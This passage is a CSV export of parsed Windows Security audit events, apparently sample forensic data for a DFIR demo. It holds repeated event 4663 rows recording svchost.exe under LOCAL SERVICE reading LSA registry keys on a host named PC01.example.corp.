87,452897,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
88,452898,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
89,452899,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
90,452900,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
91,452901,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
92,452902,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
93,452903,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
94,452904,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
95,452905,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
96,452906,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
97,452907,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
98,452908,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
99,452909,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
100,452910,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
101,452911,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
102,452912,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
103,452913,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
104,452914,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
105,452915,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
106,452916,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
107,452917,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
108,452918,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT 